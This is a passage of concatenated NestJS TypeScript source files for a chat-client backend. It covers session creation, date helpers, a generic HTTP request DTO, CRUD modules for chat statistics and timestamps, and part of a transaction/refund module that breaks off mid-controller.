createSessionWithFallback(mobile: string): Promise<SessionCreationResult> {\r\n        try {\r\n            // Use the existing createSession method which already implements all fallback strategies\r\n            return await this.createSession({ mobile });\r\n        } catch (error) {\r\n            this.logger.error(mobile, 'Error in createSessionWithFallback', error);\r\n            return {\r\n                success: false,\r\n                error: error.message || 'Failed to create session',\r\n                retryable: false\r\n            };\r\n        }\r\n    }\r\n\r\n    /**\r\n     * Calculate the age of a session in days\r\n     */\r\n    private calculateSessionAge(createdAt: Date): number {\r\n        const now = new Date();\r\n        const sessionDate = new Date(createdAt);\r\n        const diffTime = Math.abs(now.getTime() - sessionDate.getTime());\r\n        const diffDays = Math.ceil(diffTime / (1000 * 60 * 60 * 24));\r\n        return diffDays;\r\n    }\r\n}","/**\n * Shared utility methods for client services (buffer-client and promote-client)\n * Contains identical helper methods used by both services\n */\nexport class ClientHelperUtils {\n    /**\n     * Get timestamp from date string or Date object\n     * Returns 0 if date is null, undefined, or invalid\n     */\n    static getTimestamp(date: Date | string | null | undefined): number {\n        if (!date) return 0;\n        try {\n            return new Date(date).getTime();\n        } catch {\n            return 0;\n        }\n    }\n\n    /**\n     * Get today's date string in 'YYYY-MM-DD' format\n     */\n    static getTodayDateString(): string {\n        return new Date().toISOString().split('T')[0];\n    }\n\n    /**\n     * Get date string N days ago in 'YYYY-MM-DD' format\n     * @param days - Number of days ago\n     * @param oneDayMs - Milliseconds in one day (24 * 60 * 60 * 1000)\n     */\n    static getDateStringDaysAgo(days: number, oneDayMs: number): string {\n        return new Date(Date.now() - days * oneDayMs).toISOString().split('T')[0];\n    }\n\n    /**\n     * Create backfill timestamps for old documents\n     * Creates timestamps in the past (7-25 days ago) for backfilling missing timestamp fields\n     * @param now - Current timestamp in milliseconds\n     * @param oneDayMs - Milliseconds in one day (24 * 60 * 60 * 1000)\n     */\n    static createBackfillTimestamps(now: number, oneDayMs: number): Record<string, Date> {\n        return {\n            privacyUpdatedAt: new Date(now - (25 * oneDayMs)),\n            profilePicsDeletedAt: new Date(now - (20 * oneDayMs)),\n            nameBioUpdatedAt: new Date(now - (14 * oneDayMs)),\n            usernameUpdatedAt: new Date(now - (10 * oneDayMs)),\n            profilePicsUpdatedAt: new Date(now - (7 * oneDayMs)),\n        };\n    }\n}\n","import { IsOptional, IsEnum, IsObject, IsUrl, IsNumber, Min, Max } from 'class-validator';\r\nimport { ApiProperty, ApiPropertyOptional } from '@nestjs/swagger';\r\nimport { Method } from 'axios';\r\nimport { Transform } from 'class-transformer';\r\n\r\nenum ResponseType {\r\n    JSON = 'json',\r\n    TEXT = 'text',\r\n    STREAM = 'stream',\r\n    BLOB = 'blob',\r\n    DOCUMENT = 'document',\r\n    ARRAYBUFFER = 'arraybuffer'\r\n}\r\n\r\nexport class ExecuteRequestDto {\r\n    @ApiProperty({ description: 'The URL to send the request to' })\r\n    @IsUrl({}, { message: 'Please provide a valid URL' })\r\n    url: string;\r\n\r\n    @ApiPropertyOptional({ enum: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS'], default: 'GET' })\r\n    @IsEnum(['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS'] as const)\r\n    @IsOptional()\r\n    method?: Method;\r\n\r\n    @ApiPropertyOptional({ type: Object, additionalProperties: { type: \"string\" } })\r\n    @IsObject()\r\n    @IsOptional()\r\n    headers?: Record<string, string>;\r\n\r\n    @ApiPropertyOptional({ description: 'Request body data' })\r\n    @IsOptional()\r\n    data?: any;\r\n\r\n    @ApiPropertyOptional({ type: Object, additionalProperties: { type: 'string' } })\r\n    @IsObject()\r\n    @IsOptional()\r\n    params?: Record<string, string>;\r\n\r\n    @ApiPropertyOptional({ enum: ResponseType, default: ResponseType.JSON })\r\n    @IsEnum(ResponseType)\r\n    @IsOptional()\r\n    responseType?: ResponseType;\r\n\r\n    @ApiPropertyOptional({ description: 'Request timeout in milliseconds', default: 30000, minimum: 1000, maximum: 300000 })\r\n    @IsNumber()\r\n    @Min(1000)\r\n    @Max(300000)\r\n    @IsOptional()\r\n    @Transform(({ value }) => parseInt(value))\r\n    timeout?: number;\r\n\r\n    @ApiPropertyOptional({ description: 'Whether to follow redirects', default: true })\r\n    @IsOptional()\r\n    @Transform(({ value }) => value === 'true' || value === true)\r\n    followRedirects?: boolean;\r\n\r\n    @ApiPropertyOptional({ description: 'Maximum number of redirects to follow', default: 5, minimum: 0, maximum: 10 })\r\n    @IsNumber()\r\n    @Min(0)\r\n    @Max(10)\r\n    @IsOptional()\r\n    @Transform(({ value }) => parseInt(value))\r\n    maxRedirects?: number;\r\n}","export * from './dto/execute-request.dto';\n","// create-stat.dto.ts\nimport { ApiProperty } from '@nestjs/swagger';\n\nexport class CreateStatDto {\n  @ApiProperty({ example: '6785668464', description: 'Chat ID' })\n  chatId: string;\n\n  @ApiProperty({ example: 12, description: 'Count' })\n  count: number;\n\n  @ApiProperty({ example: 50, description: 'Pay Amount' })\n  payAmount: number;\n\n  @ApiProperty({ example: true, description: 'Demo Given' })\n  demoGiven: boolean;\n\n  @ApiProperty({ example: true, description: 'Demo Given Today' })\n  demoGivenToday: boolean;\n\n  @ApiProperty({ example: false, description: 'New User' })\n  newUser: boolean;\n\n  @ApiProperty({ example: true, description: 'Paid Reply' })\n  paidReply: boolean;\n\n  @ApiProperty({ example: 'Amaan Khan', description: 'Name' })\n  name: string;\n\n  @ApiProperty({ example: false, description: 'Second Show' })\n  secondShow: boolean;\n\n  @ApiProperty({ example: null, description: 'Did Pay' })\n  didPay: boolean | null;\n\n  @ApiProperty({ example: 'shruthi1', description: 'Client' })\n  client: string;\n\n  @ApiProperty({ example: 'shruthi', description: 'Profile' })\n  profile: string;\n}\n","export { CreateStatDto as Stat1CreateDto } from './create-stat.dto';\nexport { StatController as Stat1Controller } from './stat.controller';\nexport { StatModule as Stat1Module } from './stat.module';\nexport { StatService as Stat1Service } from './stat.service';\nexport { Stat as Stat1, StatDocument as Stat1Document, StatSchema as Stat1Schema } from './stat.schema';\nexport { UpdateStatDto as Stat1UpdateDto } from './update-stat.dto';\n","import { Body, Controller, Delete, Get, Param, Post, Put } from '@nestjs/common';\nimport { ApiTags } from '@nestjs/swagger';\nimport { StatService } from './stat.service';\nimport { CreateStatDto } from './create-stat.dto';\nimport { UpdateStatDto } from './update-stat.dto';\n\n@ApiTags('stats')\n@Controller('stats')\nexport class StatController {\n  constructor(private readonly statService: StatService) {}\n\n  @Post()\n  async create(@Body() createStatDto: CreateStatDto) {\n    return this.statService.create(createStatDto);\n  }\n\n  @Get(':chatId/:profile')\n  async findByChatIdAndProfile(@Param('chatId') chatId: string, @Param('profile') profile: string) {\n    return this.statService.findByChatIdAndProfile(chatId, profile);\n  }\n\n  @Put(':chatId/:profile')\n  async update(\n    @Param('chatId') chatId: string,\n    @Param('profile') profile: string,\n    @Body() updateStatDto: UpdateStatDto,\n  ) {\n    return this.statService.update(chatId, profile, updateStatDto);\n  }\n\n  @Delete(':chatId/:profile')\n  async deleteOne(@Param('chatId') chatId: string, @Param('profile') profile: string) {\n    return this.statService.deleteOne(chatId, profile);\n  }\n\n  @Delete()\n  async deleteAll() {\n    return this.statService.deleteAll();\n  }\n}\n","import { Module } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { StatService } from './stat.service';\nimport { StatController } from './stat.controller';\nimport { StatSchema } from './stat.schema';\nimport { InitModule } from '../ConfigurationInit/init.module';\n\n@Module({\n    imports: [\n        InitModule,\n        MongooseModule.forFeature([{ name: \"StatsModule\", collection: \"stats\", schema: StatSchema }])],\n    controllers: [StatController],\n    providers: [StatService],\n    exports:[StatService]\n})\nexport class StatModule { }\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\nimport { ApiProperty } from '@nestjs/swagger';\nimport { Document } from 'mongoose';\n\nexport type StatDocument = Stat & Document;\n\n@Schema()\nexport class Stat {\n  @ApiProperty({ example: '6785668464', description: 'Chat ID' })\n  @Prop({ required: true })\n  chatId: string;\n\n  @ApiProperty({ example: 12, description: 'Count' })\n  @Prop({ required: true })\n  count: number;\n\n  @ApiProperty({ example: 50, description: 'Pay Amount' })\n  @Prop({ required: true })\n  payAmount: number;\n\n  @ApiProperty({ example: true, description: 'Demo Given' })\n  @Prop({ required: true })\n  demoGiven: boolean;\n\n  @ApiProperty({ example: true, description: 'Demo Given Today' })\n  @Prop({ required: true })\n  demoGivenToday: boolean;\n\n  @ApiProperty({ example: false, description: 'New User' })\n  @Prop({ required: true })\n  newUser: boolean;\n\n  @ApiProperty({ example: true, description: 'Paid Reply' })\n  @Prop({ required: true })\n  paidReply: boolean;\n\n  @ApiProperty({ example: 'Amaan Khan', description: 'Name' })\n  @Prop({ required: true })\n  name: string;\n\n  @ApiProperty({ example: false, description: 'Second Show' })\n  @Prop({ required: true })\n  secondShow: boolean;\n\n  @ApiProperty({ example: null, description: 'Did Pay' })\n  @Prop({ required: false })\n  didPay: boolean | null;\n\n  @ApiProperty({ example: 'shruthi1', description: 'Client' })\n  @Prop({ required: true })\n  client: string;\n\n  @ApiProperty({ example: 'shruthi', description: 'Profile' })\n  @Prop({ required: true })\n  profile: string;\n}\n\nexport const StatSchema = SchemaFactory.createForClass(Stat);\nStatSchema.index({ chatId: 1, profile: 1, client: 1 }, { unique: true });\n","import { Injectable, NotFoundException } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { CreateStatDto } from './create-stat.dto';\nimport { UpdateStatDto } from './update-stat.dto';\nimport { Stat, StatDocument } from './stat.schema';\n\n@Injectable()\nexport class StatService {\n  constructor(@InjectModel(\"StatsModule\") private statModel: Model<StatDocument>) {}\n\n  async create(createStatDto: CreateStatDto): Promise<Stat> {\n    const createdStat = new this.statModel(createStatDto);\n    return createdStat.save();\n  }\n\n  async findAll(): Promise<Stat[]> {\n    const stats = await this.statModel.find().exec();\n    return stats;\n  }\n\n  async findByChatIdAndProfile(chatId: string, profile: string): Promise<Stat> {\n    const stat = await this.statModel.findOne({ chatId, profile }).exec();\n    if (!stat) {\n      throw new NotFoundException(`Stat not found for chatId ${chatId} and profile ${profile}`);\n    }\n    return stat;\n  }\n\n  async update(chatId: string, profile: string, updateStatDto: UpdateStatDto): Promise<Stat> {\n    const stat = await this.statModel.findOneAndUpdate({ chatId, profile }, updateStatDto, { new: true }).exec();\n    if (!stat) {\n      throw new NotFoundException(`Stat not found for chatId ${chatId} and profile ${profile}`);\n    }\n    return stat;\n  }\n\n  async deleteOne(chatId: string, profile: string): Promise<void> {\n    const result = await this.statModel.deleteOne({ chatId, profile }).exec();\n    if (result.deletedCount === 0) {\n      throw new NotFoundException(`Stat not found for chatId ${chatId} and profile ${profile}`);\n    }\n  }\n\n  async deleteAll(): Promise<void> {\n    await this.statModel.deleteMany({}).exec();\n  }\n}\n","// update-stat.dto.ts\nimport { PartialType } from '@nestjs/swagger';\nimport { CreateStatDto } from './create-stat.dto';\n\nexport class UpdateStatDto extends PartialType(CreateStatDto) {}\n","// create-stat.dto.ts\nimport { ApiProperty } from '@nestjs/swagger';\n\nexport class CreateStatDto {\n  @ApiProperty({ example: '6785668464', description: 'Chat ID' })\n  chatId: string;\n\n  @ApiProperty({ example: 12, description: 'Count' })\n  count: number;\n\n  @ApiProperty({ example: 50, description: 'Pay Amount' })\n  payAmount: number;\n\n  @ApiProperty({ example: true, description: 'Demo Given' })\n  demoGiven: boolean;\n\n  @ApiProperty({ example: true, description: 'Demo Given Today' })\n  demoGivenToday: boolean;\n\n  @ApiProperty({ example: false, description: 'New User' })\n  newUser: boolean;\n\n  @ApiProperty({ example: true, description: 'Paid Reply' })\n  paidReply: boolean;\n\n  @ApiProperty({ example: 'Amaan Khan', description: 'Name' })\n  name: string;\n\n  @ApiProperty({ example: false, description: 'Second Show' })\n  secondShow: boolean;\n\n  @ApiProperty({ example: null, description: 'Did Pay' })\n  didPay: boolean | null;\n\n  @ApiProperty({ example: 'shruthi1', description: 'Client' })\n  client: string;\n\n  @ApiProperty({ example: 'shruthi', description: 'Profile' })\n  profile: string;\n}\n","export { CreateStatDto as Stat2CreateDto } from './create-stat2.dto';\nexport { Stat2Controller } from './stat2.controller';\nexport { Stat2Module } from './stat2.module';\nexport { Stat2Service } from './stat2.service';\nexport { Stat2, Stat2Document, StatSchema as Stat2Schema } from './stat2.schema';\nexport { UpdateStatDto as Stat2UpdateDto } from './update-stat2.dto';\n","import { Body, Controller, Delete, Get, Param, Post, Put } from '@nestjs/common';\nimport { ApiTags } from '@nestjs/swagger';\nimport { Stat2Service } from './stat2.service';\nimport { CreateStatDto } from './create-stat2.dto';\nimport { UpdateStatDto } from './update-stat2.dto';\n\n@ApiTags('stats2')\n@Controller('stats2')\nexport class Stat2Controller {\n  constructor(private readonly statService: Stat2Service) {}\n\n  @Post()\n  async create(@Body() createStatDto: CreateStatDto) {\n    return this.statService.create(createStatDto);\n  }\n\n  @Get(':chatId/:profile')\n  async findByChatIdAndProfile(@Param('chatId') chatId: string, @Param('profile') profile: string) {\n    return this.statService.findByChatIdAndProfile(chatId, profile);\n  }\n\n  @Put(':chatId/:profile')\n  async update(\n    @Param('chatId') chatId: string,\n    @Param('profile') profile: string,\n    @Body() updateStatDto: UpdateStatDto,\n  ) {\n    return this.statService.update(chatId, profile, updateStatDto);\n  }\n\n  @Delete(':chatId/:profile')\n  async deleteOne(@Param('chatId') chatId: string, @Param('profile') profile: string) {\n    return this.statService.deleteOne(chatId, profile);\n  }\n\n  @Delete()\n  async deleteAll() {\n    return this.statService.deleteAll();\n  }\n}\n","import { Module } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { Stat2Service } from './stat2.service';\nimport { Stat2Controller } from './stat2.controller';\nimport { StatSchema } from './stat2.schema';\nimport { InitModule } from '../ConfigurationInit/init.module';\n\n@Module({\n    imports: [\n        InitModule,\n        MongooseModule.forFeature([{ name: \"Stats2Module\", collection: \"stats2\", schema: StatSchema }])],\n    controllers: [Stat2Controller],\n    providers: [Stat2Service],\n    exports: [Stat2Service]\n})\nexport class Stat2Module { }\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\nimport { ApiProperty } from '@nestjs/swagger';\nimport { Document } from 'mongoose';\n\nexport type Stat2Document = Stat2 & Document;\n\n@Schema()\nexport class Stat2 {\n  @ApiProperty({ example: '6785668464', description: 'Chat ID' })\n  @Prop({ required: true })\n  chatId: string;\n\n  @ApiProperty({ example: 12, description: 'Count' })\n  @Prop({ required: true })\n  count: number;\n\n  @ApiProperty({ example: 50, description: 'Pay Amount' })\n  @Prop({ required: true })\n  payAmount: number;\n\n  @ApiProperty({ example: true, description: 'Demo Given' })\n  @Prop({ required: true })\n  demoGiven: boolean;\n\n  @ApiProperty({ example: true, description: 'Demo Given Today' })\n  @Prop({ required: true })\n  demoGivenToday: boolean;\n\n  @ApiProperty({ example: false, description: 'New User' })\n  @Prop({ required: true })\n  newUser: boolean;\n\n  @ApiProperty({ example: true, description: 'Paid Reply' })\n  @Prop({ required: true })\n  paidReply: boolean;\n\n  @ApiProperty({ example: 'Amaan Khan', description: 'Name' })\n  @Prop({ required: true })\n  name: string;\n\n  @ApiProperty({ example: false, description: 'Second Show' })\n  @Prop({ required: true })\n  secondShow: boolean;\n\n  @ApiProperty({ example: null, description: 'Did Pay' })\n  @Prop({ required: false })\n  didPay: boolean | null;\n\n  @ApiProperty({ example: 'shruthi1', description: 'Client' })\n  @Prop({ required: true })\n  client: string;\n\n  @ApiProperty({ example: 'shruthi', description: 'Profile' })\n  @Prop({ required: true })\n  profile: string;\n}\n\nexport const StatSchema = SchemaFactory.createForClass(Stat2);\nStatSchema.index({ chatId: 1, profile: 1, client: 1 }, { unique: true });\n","import { Injectable, NotFoundException } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { CreateStatDto } from './create-stat2.dto';\nimport { UpdateStatDto } from './update-stat2.dto';\nimport { Stat2, Stat2Document } from './stat2.schema';\n\n@Injectable()\nexport class Stat2Service {\n  constructor(@InjectModel(\"Stats2Module\") private statModel: Model<Stat2Document>) {}\n\n  async create(createStatDto: CreateStatDto): Promise<Stat2> {\n    const createdStat = new this.statModel(createStatDto);\n    return createdStat.save();\n  }\n\n  async findByChatIdAndProfile(chatId: string, profile: string): Promise<Stat2> {\n    const stat = await this.statModel.findOne({ chatId, profile }).exec();\n    if (!stat) {\n      throw new NotFoundException(`Stat not found for chatId ${chatId} and profile ${profile}`);\n    }\n    return stat;\n  }\n\n  async update(chatId: string, profile: string, updateStatDto: UpdateStatDto): Promise<Stat2> {\n    const stat = await this.statModel.findOneAndUpdate({ chatId, profile }, updateStatDto, { new: true }).exec();\n    if (!stat) {\n      throw new NotFoundException(`Stat not found for chatId ${chatId} and profile ${profile}`);\n    }\n    return stat;\n  }\n\n  async findAll(): Promise<Stat2[]> {\n    const stats = await this.statModel.find().exec();\n    return stats;\n  }\n\n  async deleteOne(chatId: string, profile: string): Promise<void> {\n    const result = await this.statModel.deleteOne({ chatId, profile }).exec();\n    if (result.deletedCount === 0) {\n      throw new NotFoundException(`Stat not found for chatId ${chatId} and profile ${profile}`);\n    }\n  }\n\n  async deleteAll(): Promise<void> {\n    await this.statModel.deleteMany({}).exec();\n  }\n}\n","// update-stat.dto.ts\nimport { PartialType } from '@nestjs/swagger';\nimport { CreateStatDto } from './create-stat2.dto';\n\nexport class UpdateStatDto extends PartialType(CreateStatDto) {}\n","export * from './timestamp.controller';\nexport * from './timestamp.module';\nexport * from './timestamp.service';\n","import { Controller, Get, Body, Patch, Query } from '@nestjs/common';\nimport { ApiTags, ApiOperation, ApiBody, ApiQuery } from '@nestjs/swagger';\nimport { TimestampService } from './timestamp.service';\n\n@ApiTags('Timestamps')\n@Controller('timestamps')\nexport class TimestampController {\n  constructor(private readonly timestampService: TimestampService) {}\n\n  @Get()\n  @ApiOperation({ summary: 'Get timestamp data' })\n  async findOne(): Promise<any> {\n    return this.timestampService.findOne();\n  }\n\n  @Get('stalled')\n  @ApiOperation({ summary: 'Get clients with time differences greater than threshold' })\n  @ApiQuery({ \n    name: 'threshold', \n    type: Number, \n    required: false, \n    description: 'Minimum time difference in minutes (default: 3)' \n  })\n  async getClientsWithTimeDifference(@Query('threshold') thresholdMinutes?: number): Promise<any[]> {\n    // Convert minutes to milliseconds, default to 3 minutes if not provided\n    const threshold = thresholdMinutes ? thresholdMinutes * 60 * 1000 : 3 * 60 * 1000;\n    return this.timestampService.getClientsWithTimeDifference(threshold);\n  }\n\n  @Patch()\n  @ApiOperation({ summary: 'Update timestamp data' })\n  @ApiBody({ type: Object })\n  async update(@Body() updateTimestampDto: any): Promise<any> {\n    return this.timestampService.update(updateTimestampDto);\n  }\n}","import { Module, Global, forwardRef } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { TimestampService } from './timestamp.service';\nimport { TimestampController } from './timestamp.controller';\nimport { TimestampSchema } from './timestamps.schema';\nimport { ClientModule } from '../clients/client.module';\nimport { InitModule } from '../ConfigurationInit';\n\n@Global()\n@Module({\n  imports: [\n    InitModule,\n    MongooseModule.forFeature([{ \n      name: 'timestampModule', \n      collection: 'timestamps', \n      schema: TimestampSchema \n    }]),\n    forwardRef(() => ClientModule),\n  ],\n  providers: [TimestampService],\n  controllers: [TimestampController],\n  exports: [TimestampService],\n})\nexport class TimestampModule {}","import { Injectable, NotFoundException, Inject, forwardRef } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { Timestamp } from './timestamps.schema';\nimport { ClientService } from '../clients/client.service';\n\n@Injectable()\nexport class TimestampService {\n    constructor(\n        @InjectModel('timestampModule') private timestampModel: Model<Timestamp>,\n        @Inject(forwardRef(() => ClientService))\n        private clientService: ClientService,\n    ) { }\n\n    async findOne(): Promise<any> {\n        const timestamp = await this.timestampModel.findOne({}).lean().exec();\n        if (!timestamp) {\n            throw new NotFoundException(`Timestamp not found`);\n        }\n\n        // Ensure _id is removed from the response\n        if (timestamp._id) {\n            delete timestamp._id;\n        }\n\n        return timestamp;\n    }\n\n    async getTimeDifferences(threshold: number = 3 * 60 * 1000): Promise<any> {\n        const timestamp = await this.timestampModel.findOne({}).lean().exec();\n        if (!timestamp) {\n            throw new NotFoundException(`Timestamp not found`);\n        }\n\n        const currentTime = Date.now();\n        const differences = {};\n\n        // Loop through each timestamp entry\n        Object.keys(timestamp).forEach(key => {\n            // Skip the _id field and non-numeric values\n            if (key === '_id' || typeof timestamp[key] !== 'number') {\n                return;\n            }\n\n            const difference = currentTime - timestamp[key];\n\n            // Only include differences that are greater than the threshold\n            if (difference > threshold) {\n                differences[key] = difference;\n            }\n        });\n\n        return differences;\n    }\n\n    async getClientsWithTimeDifference(threshold: number = 3 * 60 * 1000): Promise<any[]> {\n        const differences = await this.getTimeDifferences(threshold);\n        const clientIds = Object.keys(differences);\n\n        if (clientIds.length === 0) {\n            return [];\n        }\n\n        const urls = [];\n        for (const clientId of clientIds) {\n            const clientParams = clientId.split('_');\n            try {\n                const client = await this.clientService.findOne(clientParams[0], false);\n                if (client) {\n                    if (clientParams[1]) {\n                        urls.push(client.promoteRepl);\n                    } else {\n                        urls.push(client.repl);\n                    }\n                }\n            } catch (error) {\n                console.error(`Error fetching client with ID ${clientId}:`, error.message);\n            }\n        }\n\n        return urls;\n    }\n\n    async update(updateTimestampDto: any): Promise<any> {\n        // Ensure _id is removed from the input\n        delete updateTimestampDto['_id'];\n\n        const updatedTimestamp = await this.timestampModel.findOneAndUpdate(\n            {}, // Update the first document found in the collection\n            { $set: { ...updateTimestampDto } },\n            { new: true, upsert: true, lean: true }\n        ).exec();\n\n        if (!updatedTimestamp) {\n            throw new NotFoundException(`Timestamp not found`);\n        }\n\n        // Ensure _id is removed from the response\n        if (updatedTimestamp._id) {\n            delete updatedTimestamp._id;\n        }\n\n        return updatedTimestamp;\n    }\n\n    /**\n     * Clears the timestamp document by removing all fields except `_id`.\n     * If no document exists, creates an empty one and returns it.\n     */\n    async clear(): Promise<any> {\n        const timestamp = await this.timestampModel.findOne({}).lean().exec();\n\n        // If there's no document, create an empty one\n        if (!timestamp) {\n            const created = await this.timestampModel.create({});\n            const createdObj = created.toObject ? created.toObject() : { ...created };\n            if (createdObj._id) {\n                delete createdObj._id;\n            }\n            return createdObj;\n        }\n\n        // Determine keys to unset (exclude _id)\n        const keys = Object.keys(timestamp).filter(k => k !== '_id');\n\n        if (keys.length === 0) {\n            const copy = { ...timestamp };\n            if (copy._id) delete copy._id;\n            return copy;\n        }\n\n        const unsetObj: any = {};\n        for (const k of keys) {\n            unsetObj[k] = \"\"; // value ignored by $unset\n        }\n\n        await this.timestampModel.updateOne({}, { $unset: unsetObj }).exec();\n\n        const updated = await this.timestampModel.findOne({}).lean().exec();\n        if (updated && updated._id) delete updated._id;\n        return updated || {};\n    }\n\n\n}","import { Schema, SchemaFactory } from '@nestjs/mongoose';\nimport mongoose, { Document } from 'mongoose';\n\nexport type TimestampDocument = Timestamp & Document;\n\n@Schema({\n  versionKey: false, \n  autoIndex: true, \n  strict: false,  \n  timestamps: true,\n  toJSON: {\n    virtuals: true,\n    transform: (doc, ret) => {\n      delete ret._id;\n    },\n  },\n})\nexport class Timestamp {}\n\nexport const TimestampSchema = SchemaFactory.createForClass(Timestamp);\nTimestampSchema.add({ type: mongoose.Schema.Types.Mixed });","import { ApiProperty, ApiPropertyOptional } from '@nestjs/swagger';\nimport { IsString, IsNumber, IsOptional, IsEnum, MinLength, Min, IsNotEmpty } from 'class-validator';\nimport { Transform } from 'class-transformer';\n\nexport enum TransactionStatus {\n  PENDING = 'pending',\n  COMPLETED = 'completed',\n  FAILED = 'failed',\n  CANCELLED = 'cancelled'\n}\n\nexport class CreateTransactionDto {\n  @ApiProperty({ \n    description: 'Unique transaction ID (UTR)',\n    example: 'TXN123456789',\n    minLength: 8 \n  })\n  @IsString()\n  @IsNotEmpty()\n  @MinLength(8)\n  @Transform(({ value }) => typeof value === 'string' ? value.toLowerCase() : value)\n  transactionId: string;\n\n  @ApiProperty({ \n    description: 'Amount involved in the transaction',\n    example: 100.50,\n    minimum: 0 \n  })\n  @IsNumber()\n  @Min(0)\n  @Transform(({ value }) => parseFloat(value))\n  amount: number;\n\n  @ApiProperty({ \n    description: 'Issue type reported by the user',\n    example: 'payment_failed'\n  })\n  @IsString()\n  @IsNotEmpty()\n  issue: string;\n\n  @ApiProperty({ \n    description: 'Description of issue reported by the user',\n    example: 'Payment failed due to network error'\n  })\n  @IsString()\n  @IsNotEmpty()\n  description: string;\n\n  @ApiPropertyOptional({\n    description: 'Refund method selected by the user',\n    example: 'bank_transfer',\n    required: false\n  })\n  @IsString()\n  @IsOptional()\n  refundMethod?: string;\n\n  @ApiPropertyOptional({ \n    description: 'User profile ID',\n    example: 'user123',\n    required: false \n  })\n  @IsString()\n  @IsOptional()\n  profile: string = \"undefined\";\n\n  @ApiPropertyOptional({ \n    description: 'User chat ID',\n    example: 'chat123',\n    required: false\n  })\n  @IsString()\n  @IsOptional()\n  chatId: string = \"undefined\";\n\n  @ApiPropertyOptional({ \n    description: 'IP address of the user',\n    example: '192.168.1.1',\n    required: false\n  })\n  @IsString()\n  @IsOptional()\n  ip: string = \"undefined\";\n\n  @ApiPropertyOptional({ \n    description: 'Transaction status',\n    enum: TransactionStatus,\n    default: TransactionStatus.PENDING,\n    required: false\n  })\n  @IsEnum(TransactionStatus)\n  @IsOptional()\n  status: TransactionStatus = TransactionStatus.PENDING;\n}\n","export * from './create-transaction.dto';\nexport * from './update-transaction.dto';","import { PartialType } from '@nestjs/swagger';\nimport { CreateTransactionDto } from './create-transaction.dto';\n\nexport class UpdateTransactionDto extends PartialType(CreateTransactionDto) {}","export * from './transaction.controller';\nexport * from './transaction.module';\nexport * from './transaction.service';\nexport * from './schemas/transaction.schema';\nexport * from './dto';\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\nimport { Document, Schema as MongooseSchema } from 'mongoose';\nimport { ApiProperty } from '@nestjs/swagger';\nimport { TransactionStatus } from '../dto/create-transaction.dto';\n\nexport type TransactionDocument = Transaction & Document;\n\n@Schema({\n  collection: 'transactions',\n  versionKey: false,\n  autoIndex: true,\n  timestamps: true,\n  toJSON: {\n    virtuals: true,\n    transform: (doc, ret) => {\n      ret['id'] = ret._id;\n      delete ret._id;\n      return ret;\n    },\n  }\n})\nexport class Transaction {\n  @ApiProperty({ description: 'Unique transaction ID (UTR)' })\n  @Prop({\n    type: MongooseSchema.Types.String,\n    required: true,\n    unique: true,\n    index: true\n  })\n  transactionId: string;\n\n  @ApiProperty({ description: 'Amount involved in the transaction' })\n  @Prop({\n    type: MongooseSchema.Types.Number,\n    required: true,\n    min: 0\n  })\n  amount: number;\n\n  @ApiProperty({ description: 'Issue type reported by the user' })\n  @Prop({\n    type: MongooseSchema.Types.String,\n    required: true,\n    index: true\n  })\n  issue: string;\n\n  @ApiProperty({ description: 'Description of issue reported by the user' })\n  @Prop({\n    type: MongooseSchema.Types.String,\n    required: true\n  })\n  description: string;\n\n  @ApiProperty({ description: 'Refund method selected by the user' })\n  @Prop({\n    type: MongooseSchema.Types.String,\n    default: 'undefined',\n    index: true\n  })\n  refundMethod: string;\n\n  @ApiProperty({ description: 'User profile ID' })\n  @Prop({\n    type: MongooseSchema.Types.String,\n    default: 'undefined',\n    index: true\n  })\n  profile: string;\n\n  @ApiProperty({ description: 'User chat ID' })\n  @Prop({\n    type: MongooseSchema.Types.String,\n    default: 'undefined',\n    index: true\n  })\n  chatId: string;\n\n  @ApiProperty({ description: 'IP address of the user' })\n  @Prop({\n    type: MongooseSchema.Types.String,\n    default: 'undefined'\n  })\n  ip: string;\n\n  @ApiProperty({\n    description: 'Transaction status',\n    enum: TransactionStatus,\n    default: TransactionStatus.PENDING\n  })\n  @Prop({\n    type: MongooseSchema.Types.String,\n    enum: Object.values(TransactionStatus),\n    default: TransactionStatus.PENDING,\n    index: true\n  })\n  status: TransactionStatus;\n\n  @ApiProperty({ description: 'Creation timestamp' })\n  @Prop({ type: Date })\n  createdAt?: Date;\n\n  @ApiProperty({ description: 'Last update timestamp' })\n  @Prop({ type: Date })\n  updatedAt?: Date;\n}\n\nexport const TransactionSchema = SchemaFactory.createForClass(Transaction);","import { Body, Controller, Get, Post, Put, Delete, Param, Query, HttpStatus, ValidationPipe, UsePipes } from '@nestjs/common';\nimport { ApiTags, ApiOperation, ApiResponse, ApiQuery, ApiParam } from '@nestjs/swagger';\nimport { CreateTransactionDto } from './dto/create-transaction.dto';\nimport { UpdateTransactionDto } from './dto/update-transaction.dto';\nimport { TransactionService } from './transaction.service';\nimport { Transaction } from './schemas/transaction.schema';\n\n@ApiTags('Transactions')\n@Controller('transactions')\nexport class TransactionController {\n  constructor(private readonly transactionService: TransactionService) {}\n\n  @Post()\n  @ApiOperation({\n    summary: 'Create a new transaction',\n    description: 'Creates a new transaction record with the provided details'\n  })\n  @ApiResponse({\n    status: HttpStatus.CREATED,\n    description: 'Transaction created successfully.',\n    type: Transaction\n  })\n  @ApiResponse({\n    status: HttpStatus.BAD_REQUEST,\n    description: 'Invalid input data provided.'\n  })\n  async create(@Body() createTransactionDto: CreateTransactionDto): Promise<Transaction> {\n    return this.transactionService.create(createTransactionDto);\n  }\n\n  @Get(':id')\n  @ApiOperation({\n    summary: 'Get transaction by ID',\n    description: 'Retrieves a specific transaction by its unique identifier'\n  })\n  @ApiParam({\n    name: 'id',\n    description: 'Transaction unique identifier',\n    required: true\n  })\n  @ApiResponse({\n    status: HttpStatus.OK,\n    description: 'Transaction retrieved successfully.',\n    type: Transaction\n  